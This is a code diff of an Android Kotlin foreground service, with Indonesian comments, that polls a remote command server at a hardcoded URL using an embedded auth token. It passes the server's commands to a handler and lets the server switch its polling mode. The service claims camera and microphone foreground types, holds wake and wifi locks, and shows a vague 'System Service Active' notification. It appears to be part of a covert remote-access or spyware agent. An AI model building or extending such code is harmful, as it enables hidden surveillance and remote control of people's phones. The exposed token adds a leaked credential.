@@ -11,7 +11,7 @@ import android.net.wifi.WifiManager
 class ControlService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var wifiLock: WifiManager.WifiLock? = null
-    private lateinit var pollingManager: PollingManager
+    private var pollingManager: PollingManager? = null
     private lateinit var commandHandler: CommandHandler
     private var localWebServer: LocalWebServer? = null
 
@@ -27,7 +27,7 @@ class ControlService : Service() {
     override fun onCreate() {
         super.onCreate()
         createNotificationChannel()
-        
+
         // Android 14+ support dengan literal angka (Safe-Build)
         if (Build.VERSION.SDK_INT >= 34) {
             val type = 1073741824 or 64 or 128 // specialUse | camera | microphone
@@ -35,7 +35,7 @@ class ControlService : Service() {
         } else {
             startForeground(NOTIFICATION_ID, createNotification())
         }
-        
+
         Log.d(TAG, "Service Created")
         acquireLocks()
 
@@ -48,18 +48,60 @@ class ControlService : Service() {
         } else {
             Log.d(TAG, "Local Web Server is disabled by user preference")
         }
-        
+
+        commandHandler = CommandHandler(this)
+
+        val isTurbo = prefs.getBoolean("turbo_mode", true)
+        startPolling(isTurbo)
+    }
+
+    /**
+     * Memulai (atau me-restart) PollingManager dengan mode yang ditentukan.
+     * Selalu hentikan instance lama sebelum membuat yang baru.
+     */
+    private fun startPolling(isTurbo: Boolean) {
+        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
         val serverUrl = prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: ""
         val devId = prefs.getString("device_id", "my_phone") ?: "unknown"
         val authToken = prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: ""
-        val isTurbo = prefs.getBoolean("turbo_mode", true)
-        
+
         var cleanUrl = serverUrl.replace("/ws", "").replace("wss://", "https://").replace("ws://", "http://")
         if (cleanUrl.endsWith("/")) cleanUrl = cleanUrl.substring(0, cleanUrl.length - 1)
 
-        commandHandler = CommandHandler(this)
-        pollingManager = PollingManager(cleanUrl, devId, authToken, commandHandler, isTurbo)
-        pollingManager.start()
+        pollingManager?.stop()
+        pollingManager = PollingManager(
+            baseUrl = cleanUrl,
+            clientId = devId,
+            authToken = authToken,
+            handler = commandHandler,
+            isTurbo = isTurbo,
+            onModeChanged = { newIsTurbo ->
+                // Dipanggil dari thread OkHttp, pindah ke main thread untuk keamanan
+                Handler(mainLooper).post {
+                    handleModeChange(newIsTurbo)
+                }
+            }
+        )
+        pollingManager?.start()
+
+        val modeLabel = if (isTurbo) "TURBO" else "NORMAL"
+        Log.d(TAG, "Polling dimulai dalam mode $modeLabel")
+    }
+
+    /**
+     * Dipanggil saat server menginstruksikan perubahan polling mode.
+     * Simpan ke SharedPrefs lalu restart polling dengan mode baru.
+     */
+    private fun handleModeChange(newIsTurbo: Boolean) {
+        val modeLabel = if (newIsTurbo) "TURBO" else "NORMAL"
+        Log.i(TAG, "Server instruksikan ganti mode → $modeLabel")
+
+        // Simpan mode baru ke SharedPreferencess agar persisten
+        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
+        prefs.edit().putBoolean("turbo_mode", newIsTurbo).apply()
+
+        // Restart polling dengan mode baru
+        startPolling(newIsTurbo)
     }
 
     private fun startWebServer() {
@@ -100,7 +142,7 @@ class ControlService : Service() {
             .setContentTitle("System Service Active")
             .setContentText("Monitoring background tasks...")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setPriority(NotificationCompat.PRIORITY_MAX) // Prioritas tertinggi
+            .setPriority(NotificationCompat.PRIORITY_MAX)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setOngoing(true)
             .setContentIntent(pendingIntent)
@@ -119,23 +161,9 @@ class ControlService : Service() {
         when (intent?.action) {
             "RESTART_POLLING" -> {
                 Log.d(TAG, "Restarting Polling Manager with new config")
-                if (::pollingManager.isInitialized) {
-                    pollingManager.stop()
-                }
-
                 val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
-                val serverUrl = prefs.getString("ws_url", "") ?: ""
-                val devId = prefs.getString("device_id", "") ?: ""
-                val authToken = prefs.getString("auth_token", "") ?: ""
                 val isTurbo = prefs.getBoolean("turbo_mode", true)
-
-                var cleanUrl = serverUrl.replace("/ws", "").replace("wss://", "https://").replace("ws://", "http://")
-                if (cleanUrl.endsWith("/")) cleanUrl = cleanUrl.substring(0, cleanUrl.length - 1)
-
-                if (cleanUrl.isNotEmpty()) {
-                    pollingManager = PollingManager(cleanUrl, devId, authToken, commandHandler, isTurbo)
-                    pollingManager.start()
-                }
+                startPolling(isTurbo)
             }
             "TOGGLE_WEB_SERVER" -> {
                 val enabled = intent.getBooleanExtra("enabled", true)
@@ -154,10 +182,8 @@ class ControlService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        if (::pollingManager.isInitialized) {
-            pollingManager.sendOfflineSignal()
-            pollingManager.stop()
-        }
+        pollingManager?.sendOfflineSignal()
+        pollingManager?.stop()
         stopWebServer()
         wakeLock?.let { if (it.isHeld) it.release() }
         wifiLock?.let { if (it.isHeld) it.release() }
